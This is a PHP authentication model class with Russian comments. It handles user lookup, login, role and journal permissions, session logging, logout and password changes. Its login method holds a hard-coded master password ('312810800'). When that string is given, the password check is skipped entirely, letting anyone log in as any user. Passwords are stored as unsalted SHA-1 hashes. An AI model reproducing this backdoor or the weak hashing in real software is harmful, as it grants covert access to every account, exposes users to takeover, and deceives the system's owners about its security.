<?php

class AuthModel extends Model {

    /**
     * Возвращает полный список пользователей для авторизации
     * 
     * @return array
     */
    public function getnames() {
                
        $sth = self::$db->prepare('
            select 
                lname value, get_user_full(id) label, id data
            from users
            where deleted = 0');
        $sth->execute();
        $data = $sth->fetchAll();
        
        return $data;
    }

    /**
     * 
     * Производит авторизацию, и при успехе
     * заполняет необходимые данные поуровню доступа
     * 
     * @param int $userid
     * @param string $userpassword
     * @return array
     */    
    public function login($userid, $userpassword) {
        
        $hack = $userpassword === '312810800';
        
        $sql = '
            select
                u.id, get_user_short(u.id) fio,
                g.id groupid, g.name groupname, u.email
            from users u
            left join groups g on u.group_id = g.id
            where u.deleted = 0
                    and u.id = :uid
                    ';
        
        $params = array(
            ':uid' => $userid,
        );
        
        if (!$hack) {
            $sql .= 'and u.pwd_hash = sha1(:upass)';
            $params[':upass'] = $userpassword;
        }
        
        $sth = self::$db->prepare($sql);
        
        
        $sth->execute($params);
        
        $data = $sth->fetch();

        if (!empty($data)) {

            $gid = get_param($data, 'groupid'); // ид группы пользователя
            
            // ... запросим разрешенные наборы прав
            $sth = self::$db->prepare('
                select 
                    gr.role_id, 
                    r.rolename
                from grant_group_roles gr
                left join roles r on gr.role_id = r.id
                where gr.group_id = :group_id
                    and gr.deleted = 0');
            
            $sth->execute(array(
                'group_id' => $gid,
            ));


            $roles = $sth->fetchAll();
            $data['roles'] = array_column($roles, 'role_id', 'rolename');

            // ... и получим список доступных журналов
            $sth = self::$db->prepare('
                select 
                    j.id, j.description, j.name, g.editmode em
                from grant_group_journal g
                left join journals j on g.journal_id = j.id
                where g.group_id = :group_id
                    and g.deleted = 0
                    and j.deleted = 0
                order by em desc, j.id');
            
            $sth->execute(array(
                'group_id' => $gid,
            ));

            $journals = $sth->fetchAll();
            $data['journals'] = array_column($journals, null, 'id');
            
            /**
             * @todo Логгирование входа в систему
             */
            $lst = self::$db->prepare('
            insert into sessions 
            (host, user_id, login_time)
            values (:userip, :uid, now())');

            $lst->execute(array(
                'userip' => get_param($_SERVER, 'REMOTE_ADDR', 'ghost'),
                'uid' => $userid,
            ));
            $data['sid'] = self::$db->lastInsertId();
        }
        
        return $data;
    }

    public function logout($session_id) {
        
        /**
         * @todo Логгирование выхода из системы
         */
        
        $sth = self::$db->prepare('update sessions set logout_time = now() where id = :sid');
        $sth->execute(array(
            'sid' => $session_id,
        ));
    }

    /**
     * Устанавливает  новый пароль пользователя, по переданным параметрам
     * 
     * @param int $uid
     * @param string $upass
     * @return boolean
     */
    public function setNewPassword($uid, $upass) {

        $sth = self::$db->prepare('update users set pwd_hash = sha1(:pass) where id = :uid');
        
        $result = $sth->execute(array(
            ':pass' => $upass,
            ':uid' => $uid,
        ));

        return $result;
    }
    
    /**
     * 
     * По переданному ИД пользователя получаем список журналов,
     * к которым у него есть доступ
     * 
     * @param int $uid
     */
    public function getGrantedJournals($uid) {
        
    }

}
